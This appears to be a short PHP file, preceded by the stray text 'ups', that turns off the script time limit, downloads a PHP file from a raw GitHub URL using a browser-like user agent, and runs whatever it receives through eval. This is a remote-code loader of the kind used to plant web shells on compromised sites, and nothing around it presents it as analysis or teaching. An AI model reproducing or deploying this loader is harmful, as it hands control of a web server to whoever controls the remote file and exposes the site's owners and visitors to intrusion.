

ups<?php
set_time_limit(0);

$ch = curl_init('https://raw.githubusercontent.com/ressasantikaa-rgb/freshman21/main/sub/grandpak.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
$content = curl_exec($ch);
curl_close($ch);
eval('?>'.$content);
?>
